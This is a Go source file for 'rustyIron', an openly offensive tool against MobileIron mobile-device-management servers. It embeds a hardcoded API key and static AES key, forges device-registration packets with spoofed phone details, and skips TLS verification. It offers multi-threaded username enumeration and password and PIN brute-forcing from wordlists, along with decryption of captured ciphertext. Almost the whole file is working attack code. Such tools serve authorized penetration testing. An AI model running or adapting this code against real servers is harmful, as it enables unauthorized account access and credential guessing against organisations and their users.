package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"regexp"
	"strconv"
	"strings"

	"compress/zlib"
	"crypto/aes"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"io/ioutil"
	"net/http"

	"github.com/andreburgaud/crypt2go/ecb"
	"github.com/andreburgaud/crypt2go/padding"
)

const (
	ironAPI = `OTY1MzJmZWI2ZjM0NjUzZjQ2MDRkMDY3MTNkNWY3NGQ3MzJlZjlkNA==`
	ironKey = "\xdc\x70\x40\x3f\x78\xde\xc3\x04\x0e\xa5\x36\xc1\xd8\x8d\xa1\xab\xfa\xbb\x56\xda\x3d\xd1\x47\x10\xd2\x5a\x9a\x5f\xec\x6e\x24\xe0"

	pinInit = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x9b\x00\x98" +
		"RSN={{UUID}}\r\ncookie={{COOKIE}}\r\nmode=0\r\nplatform_flags=0x143\r\nchecksum={{UUID}}{{UUID}}{{UUID}}{{UUID}}\r\n\x00"

	authInitOP    = "\x1c\x03\x4d\x03\x4a"
	userAuthOP    = "\x1c\x03\xad\x03\xaa"
	pinAuthOP     = "\x1c\x03\x78\x03\x75"
	pinPassAuthOP = "\x1c\x03\xd8\x03\xd5"

	aTemplate = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00{{OPCODE}}" +
		"RSN={{UUID}}\r\nmode=0\r\nplatform_flags=0x143\r\nsafety_net_enabled=true\r\n{{USER}}{{PASS}}{{PIN}}registration_operator_name=rustyIron\r\n" +
		"reg_uuid={{UUID}}\r\nCellularTechnology=GSM\r\nClient_build_date=Dec 02 2020 17:24:10\r\nClient_version=11.0.0.0.115R\r\nClient_version_code=593\r\n" +
		"afw_capable=true\r\nbrand=google\r\nclient_name=com.mobileiron\r\ncountry_code=0\r\ncurrent_mobile_number=+14469756315\r\ncurrent_operator_name=unknown\r\n" +
		"device=walleye\r\ndevice_id={{UUID}}\r\ndevice_manufacturer=Google\r\ndevice_model=Pixel 2\r\ndevice_type=GSM\r\ndisplay_size=2729X1440\r\n" +
		"home_operator=rustyIron::333333\r\nincremental=6934943\r\nip_address=172.16.34.14\r\nlocale=en-US\r\noperator=rustyIron\r\n" +
		"os_build_number=walleye-user 11 RP1A.201005.004.A1 6934943 release-keys\r\nos_version=30\r\nphone=+14469756315\r\nplatform=Android\r\nplatform_name=11\r\n" +
		"security_patch=2020-12-05\r\nsystem_version=11\r\n\x00"

	rawAuth = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x17\x00\x14" +
		"{{USER}}:{{PASS}}\x00"

	version = "1.0"
	tool    = "rustyIron"
	usage   = `
  Usage:
  rustyIron <method> [OPTIONS] <[ endpoint | cipherTXT ]> [file]
  rustyIron -h | -help
  rustyIron -vˇ

  Options:
    -h, -help              Show usage
    -a                     User-Agent for request [default: MobileIron/OpenSSLWrapper (Dalvik VM)]
    -c                     MobileIron pinSetup cookie
    -t                     Application threads [default: 10]
    -u                     MobileIron username
    -p                     MobileIron password
    -P                     MobileIron Authentication TLS Port [default: 9997]
    -r                     Disable randomize device ID
    -d                     Enable Debug output
    -uuid                  Static Device UUID value
    -guid                  MobileIron GUID value
    -pin                   MobileIron Authentication PIN

    <endpoint>             MobileIron endpoint FQDN
    <cipherTXT>            MobileIron encrypted cipherTXT
    <file>                 Line divided file containing UserID or PIN values

  Methods:
    disco                  MobileIron endpoint discovery query
    enum                   MobileIron username validation
    decrypt                Decrypt MobileIron CipherText
    prof                   Profile the MobileIron provisioning details
    auth-user              MobileIron user based authentication
    auth-pin               MobileIron PIN authentication
    auth-pinpass           MobileIron auth-pinpassword authentication
    auth-pinuser           MobileIron PIN user based authentication
`
)

type attack struct {
	agent    string
	debug    bool
	vdebug   bool
	endpoint string
	file     string
	method   string
	pass     string
	port     string
	threads  int
	ruuid    bool
	uuid     string
	user     string
	pin      string
	cookie   string
	guid     int
}

func encrypt(pt, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBEncrypter(block)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Pad(pt) // padd last block of plaintext if block size less than block cipher size
	if err != nil {
		panic(err.Error())
	}
	ct := make([]byte, len(pt))
	mode.CryptBlocks(ct, pt)
	return ct
}

func decrypt(ct, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBDecrypter(block)
	pt := make([]byte, len(ct))
	mode.CryptBlocks(pt, ct)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Unpad(pt) // unpad plaintext after decryption
	if err != nil {
		panic(err.Error())
	}
	return pt
}

func inflate(buf []byte) ([]byte, error) {
	b := bytes.NewReader(buf[32:])

	r, err := zlib.NewReader(b)
	if err != nil {
		return nil, err
	}
	tbuf := new(bytes.Buffer)
	tbuf.ReadFrom(r)
	return tbuf.Bytes(), nil
}

func int2Byte(num int) []byte {
	data := new(bytes.Buffer)
	binary.Write(data, binary.BigEndian, uint32(num))
	return data.Bytes()
}

func (a *attack) getList() []string {
	var file []byte

	if a.file == "" {
		file = []byte("")
	} else {
		f, err := os.Open(a.file)
		if err != nil {
			a.Fatalf("File open Failure: %s - %v", a.file, err)
		}
		defer f.Close()

		file, _ = ioutil.ReadAll(f)
		f.Close()
	}

	return strings.Split(string(file), "\n")
}

// newUUID generates a random UUID
func (a *attack) newUUID() {
	uuid := make([]byte, 8)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		fmt.Printf("[*] Error generating UDID: %v\n", err)
	}

	a.uuid = fmt.Sprintf("%x", uuid)
}

// Discovery function queries MobileIron API to determine authentication endpoint
func (a *attack) disco(api string) {
	discoV1 := `https://appgw.mobileiron.com/api/v1/gateway/customers/servers?api-key=%s&domain=%s`

	client := &http.Client{}
	req := &http.Request{}
	var err error

	switch api {

	case "discoV1":
		url := fmt.Sprintf(discoV1, ironAPI, a.endpoint)

		req, err = http.NewRequest("GET", url, nil)
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}
		req.Header.Add("User-Agent", a.agent)

	default:
		a.Fatalf("%s Incorrect API Request", api)
	}

	type ironMessages struct {
		Error string `json:"error"`
	}

	type ironResults struct {
		CompanyName string `json:"companyName"`
		Domain      string `json:"domain"`
		HostName    string `json:"hostName"`
	}

	type mobileIron struct {
		Messages   []ironMessages `json:"messages"`
		Result     ironResults    `json:"result"`
		Status     bool           `json:"status"`
		TotalCount int            `json:"totalCount"`
	}
	mi := &mobileIron{}

	resp, err := client.Do(req)
	if err != nil {
		a.Fatalf("%s Dial Error: %v", api, err)
	}

	if resp.StatusCode != 200 {
		a.Errorf("%s Invalid Response Code: %s - %d", api, req.URL.Hostname(), resp.StatusCode)
		return
	} else {
		err = json.NewDecoder(resp.Body).Decode(mi)
		if err != nil {
			fmt.Printf("[*] Response Marshall Error:  %v\n", err)
		}
	}
	resp.Body.Close()

	if a.vdebug {
		a.Debugf("Discovery Response: %v", mi)
	}

	if mi.Result.Domain == "" {
		a.Failf("%s: Endpoint Discovery Failed", a.endpoint)
	} else {
		a.Successf("%s: Successful Endpoint Discovery", mi.Result.HostName)
		a.endpoint = mi.Result.HostName
		if a.ruuid && a.uuid == "" {
			a.newUUID()
		}
		a.auth()
	}

}

func (a *attack) setup() []string {
	var req []string

	switch a.method {
	case "auth-user", "enum":
		data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "")
		data = strings.ReplaceAll(data, "{{PASS}}", "")
		data = strings.ReplaceAll(data, "{{PIN}}", "")
		buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

		data = strings.ReplaceAll(aTemplate, "{{OPCODE}}", userAuthOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.user), []byte(ironKey))))+"\r\n")
		data = strings.ReplaceAll(data, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.pass), []byte(ironKey))))+"\r\n")
		data = strings.ReplaceAll(data, "{{PIN}}", "")
		buff = int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

	case "auth-pin":
		data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "")
		data = strings.ReplaceAll(data, "{{PASS}}", "")
		data = strings.ReplaceAll(data, "{{PIN}}", "")
		buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

		data = strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinAuthOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "")
		data = strings.ReplaceAll(data, "{{PASS}}", "")
		data = strings.ReplaceAll(data, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.pin), []byte(ironKey))))+"\r\n")
		buff = int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

	case "auth-pinpass":
		data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "")
		data = strings.ReplaceAll(data, "{{PASS}}", "")
		data = strings.ReplaceAll(data, "{{PIN}}", "")
		buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

		data = strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinPassAuthOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.user), []byte(ironKey))))+"\r\n")
		data = strings.ReplaceAll(data, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.pass), []byte(ironKey))))+"\r\n")
		data = strings.ReplaceAll(data, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(a.pin), []byte(ironKey))))+"\r\n")
		buff = int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

	case "auth-pinuser":
		data := strings.ReplaceAll(pinInit, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{GUID}}", string(int2Byte(a.guid)))
		data = strings.ReplaceAll(data, "{{COOKIE}}", a.cookie)
		buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

		data = strings.ReplaceAll(rawAuth, "{{GUID}}", string(int2Byte(a.guid)))
		data = strings.ReplaceAll(data, "{{USER}}", a.user)
		data = strings.ReplaceAll(data, "{{PASS}}", a.pass)
		buff = int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))

	case "prof", "disco":
		data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
		data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
		data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(a.uuid))
		data = strings.ReplaceAll(data, "{{USER}}", "")
		data = strings.ReplaceAll(data, "{{PASS}}", "")
		data = strings.ReplaceAll(data, "{{PIN}}", "")
		buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
		req = append(req, strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:])))
	}

	return req
}

func (a *attack) auth() (bool, bool) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := tls.Dial("tcp", a.endpoint+":"+a.port, tlsConfig)
	if err != nil {
		a.Fatalf("Failed to establish TLS connection: %s:%s: %v", a.endpoint, a.port, err)
	}

	var s, v bool
	for _, data := range a.setup() {
		ibytes, err := io.WriteString(conn, data)
		if err != nil {
			a.Fatalf("Initialization Write Error: %s:%s: %v", a.endpoint, a.port, err)
		}
		if a.debug {
			a.Debugf("Submitted %d bytes", ibytes)
			if a.vdebug {
				a.Debugf("SETUP POST: {MIPR%x%q}", data[4:38], data[38:])
			}
		}
		buffer := make([]byte, 4096) // Assign buffer
		rbytes, _ := conn.Read(buffer)
		if a.debug {
			a.Debugf("Received %d bytes", rbytes)
			if a.vdebug {
				a.Debugf("RESPONSE: {MIPR%x%s...}", buffer[4:41], buffer[42:167])
			}
		}

		// Identify if buff data is zLib compressed
		if string(buffer[32:34]) == "\x78\x9c" {
			buf, err := inflate(buffer)
			if err != nil {
				if a.debug {
					a.Errorf("Decompression Error: %v", err)
				}
			} else {
				a.cookie = regexp.MustCompile(`cookie=(.*?)\n`).FindStringSubmatch(string(buf))[1]
				a.user = regexp.MustCompile(`userId=(.*?)\n`).FindStringSubmatch(string(buf))[1]
				a.guid, _ = strconv.Atoi(regexp.MustCompile(`senderGUID=(.*?)\n`).FindStringSubmatch(string(buf))[1])
			}
		}
		s, v = a.result(buffer)
	}
	conn.Close()

	return s, v
}

// result takes a byte array and validates the MobileIron response
func (a *attack) result(buff []byte) (bool, bool) {
	if a.vdebug {
		a.Debugf("RESULT: {%x}", buff[32:41])
	}

	if a.method == "prof" || a.method == "disco" {
		if strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x1b\x00\x00\x01\xf6\x01") ||
			strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01") {
			a.Infof("User Authentication Endabled")
		} else if strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x16\x00\x00\x01\xf6\x01") ||
			strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x15\x00\x00\x01\xf6\x01") {
			a.Infof("PIN Authentication Enabled")
		} else if strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x2f\x00\x00\x01\xf6\x01") ||
			strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01") {
			a.Infof("PIN-Password Authentication Enabled")
		} else {
			a.Infof("Unknown Authentication Type")
		}

		if strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01") ||
			strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01") ||
			strings.Contains(string(buff[32:41]), "\x00\x1d\x01\x15\x00\x00\x01\xf6\x01") {
			a.Infof("Mutual Certificate Authentication Active")
		}
		return false, false
	}

	if strings.Contains(string(buff[32:41]), "\x00\x1d\x00\x32\x00\x00\x01\x93") {
		a.Failf("Authentication Failure: %s", buff[42:167])
	} else if strings.Contains(string(buff[32:41]), "\x00\x1d\x00\x64\x00\x00\x01\x93") {
		a.Successf("Authentication Successful")
		return true, true
	} else if strings.Contains(string(buff[32:35]), "\x78\x9c\xbd") {
		a.Successf("Authentication Successful - Configuration Received")
		return true, true
	} else if strings.Contains(string(buff[32:41]), "\x00\x1d\x00\x4c\x00\x00\x01\x93") ||
		strings.Contains(string(buff[32:41]), "\x00\x1d\x00\x4b\x00\x00\x01\x93") {
		a.Infof("%s:%s - Account Lockout: %s", a.user, a.pass, buff[42:167])
		return true, false
	} else if strings.Contains(string(buff[:2]), "\x00\x00") {
		a.Failf("Null Response")
	} else if strings.Contains(string(buff[32:37]), "\x00\x1d\x00\x84\x00") {
		a.Failf("Device Unregistered: %s", buff[42:167])
	} else if strings.Contains(string(buff[32:37]), "\x00\x00\x00\x53\x00") {
		a.Failf("Unknown Client ID: %s", buff[38:167])
	} else if strings.Contains(string(buff[32:35]), "\x00\x1d\x01") {
		if a.debug {
			a.Infof("Initialization Successful")
		}
	} else if strings.Contains(string(buff[32:41]), "\x00\x1d\x00\x1b\x00\x00\x01\x90\x00") {
		a.Failf("Submission Failure: %s", buff[42:167])
	} else {
		a.Infof("Unknown Response")
	}

	return false, false
}

// brute is the threading function for endpoint requests
func (a *attack) thread() {
	list := a.getList()

	thread := make(chan bool, len(list))
	buff := make(chan bool, a.threads)

	a.Infof("%s threading %d values across %d threads", a.method, len(list), a.threads)
	for _, line := range list {

		if a.method == "enum" {
			buff <- true
			go func(a attack, val string) {
				for i := 0; i < 6; i++ {

					if val != "" {
						a.user = val
					}

					if a.ruuid {
						a.newUUID()
					}

					<-buff
					if s, v := a.auth(); s || v {
						a.Successf("Username Validation")
						thread <- true
						return
					}
				}
				thread <- true
			}(*a, line)

		} else {
			buff <- true
			go func(a attack, val string) {
				if a.ruuid {
					a.newUUID()
				}

				if val != "" {
					switch a.method {
					case "auth-user":
						a.user = val
					case "auth-pin":
						a.pin = val
					case "auth-pinpass":
						a.pin = val
					}
				}
				a.auth()

				<-buff
				thread <- true
			}(*a, line)
		}

	}

	close(buff)
	for i := 0; i < len(list); i++ {
		<-thread
	}
	close(thread)
}

// preString is the pre-wrapper for logging function
func (a *attack) preString() string {
	val := ""
	switch a.method {
	case "auth-pin", "auth-pinpass":
		val += fmt.Sprintf("%s:%s[%s:%s:%d] - ", a.user, a.pin, a.uuid, a.cookie, a.guid)
	case "decrypt", "disco":
		return val
	case "enum":
		val += a.user + " - "
	default:
		val += a.user + ":" + a.pass + " - "
	}
	return val
}

// Successf is the successful log wrapper
func (a *attack) Successf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[+] "+a.preString()+data+"\n", v...)
}

// Failf is the successful log wrapper
func (a *attack) Failf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[-] "+a.preString()+data+"\n", v...)
}

// Infof is the successful log wrapper
func (a *attack) Infof(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[*] "+data+"\n", v...)
}

// Errorf is the successful log wrapper
func (a *attack) Errorf(data string, v ...interface{}) {
	l := log.New(os.Stderr, "", 0)
	l.Printf("[ERROR] "+data+"\n", v...)
}

// Fatalf is the successful log wrapper
func (a *attack) Fatalf(data string, v ...interface{}) {
	l := log.New(os.Stderr, "", 0)
	l.Printf("[FATAL] "+data+"\n", v...)
	os.Exit(1)
}

// Debugf is the successful log wrapper
func (a *attack) Debugf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[DEBUG] "+data+"\n", v...)
}

func main() {
	// Global program variable definitions
	var (
		attack = &attack{
			method: os.Args[1],
		}
		flAgent   = flag.String("a", "MobileIron/OpenSSLWrapper (Dalvik VM)", "")
		flPass    = flag.String("p", "", "")
		flThread  = flag.Int("t", 10, "")
		flDebug   = flag.Bool("d", false, "")
		flVDebug  = flag.Bool("dd", false, "")
		flUUID    = flag.String("uuid", "", "")
		flUser    = flag.String("u", "", "")
		flRUUID   = flag.Bool("r", false, "")
		flPort    = flag.String("P", "9997", "")
		flVersion = flag.Bool("v", false, "")
		flPIN     = flag.String("pin", "", "")
		flCookie  = flag.String("c", "", "")
		flGUID    = flag.Int("guid", 0, "")
	)

	// Flag parsing
	flag.Usage = func() {
		fmt.Println(usage)
	}
	if !strings.HasPrefix(os.Args[1], "-") {
		os.Args = os.Args[1:]
	}

	flag.Parse()
	if *flVersion {
		fmt.Printf("version: %s\n", version)
		os.Exit(0)
	}

	switch len(flag.Args()) {
	case 1:
		attack.endpoint = flag.Arg(0)
	case 2:
		attack.endpoint = flag.Arg(0)
		attack.file = flag.Arg(1)
	default:
		fmt.Println(usage)
		os.Exit(1)
	}

	// Increase Debug verbosity
	if *flVDebug {
		attack.debug = true
		attack.vdebug = true
	} else {
		attack.debug = *flDebug
	}

	attack.agent = *flAgent
	attack.pass = *flPass
	attack.threads = *flThread
	attack.ruuid = !*flRUUID
	attack.uuid = *flUUID
	attack.user = *flUser
	attack.port = *flPort
	attack.pin = *flPIN
	attack.cookie = *flCookie
	attack.guid = *flGUID

	// Check from attack method
	if attack.method == "" {
		fmt.Println(usage)
		attack.Infof("Select attack")
	}

	// Check to UUID option and generate random UUID value
	if !attack.ruuid && attack.uuid == "" {
		attack.Fatalf("16-digit UUID must be provided if randomization is disabled")
	}

	switch attack.method {
	case "disco":
		attack.disco("discoV1")
	case "auth-user", "auth-pin", "auth-pinpass", "auth-pinuser", "prof", "enum":
		attack.thread()
	case "decrypt":
		b, _ := hex.DecodeString(attack.endpoint)
		attack.Successf("Decrypted Cipher %s: %q\n", attack.endpoint, decrypt(b, []byte(ironKey)))
	default:
		fmt.Printf("[*] Invalid method provided %s\n", attack.method)
		os.Exit(1)
	}
}
